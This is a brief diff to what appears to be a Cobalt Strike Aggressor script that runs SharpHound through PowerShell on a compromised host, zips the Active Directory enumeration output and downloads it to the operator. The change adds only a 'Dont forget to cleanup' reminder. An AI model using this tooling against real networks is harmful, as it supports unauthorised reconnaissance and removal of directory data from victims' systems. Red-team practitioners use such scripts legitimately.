@@ -44,6 +44,7 @@ sub bloodhound{
             btask($bid, 'Executing SharpHound via PowerShell');
             bpowershell($bid, 'Invoke-Bloodhound'.$cmdargs.' -NoSaveCache -ZipFileName "'.$random_zip.'.zip"');
             bdownload($bid, $random_zip.'.zip');
+            btask($bid, 'Dont forget to cleanup');
         }
         else if ($3["execmethod"] eq "Execute-Assembly"){
             $random_zip = random_string(10);
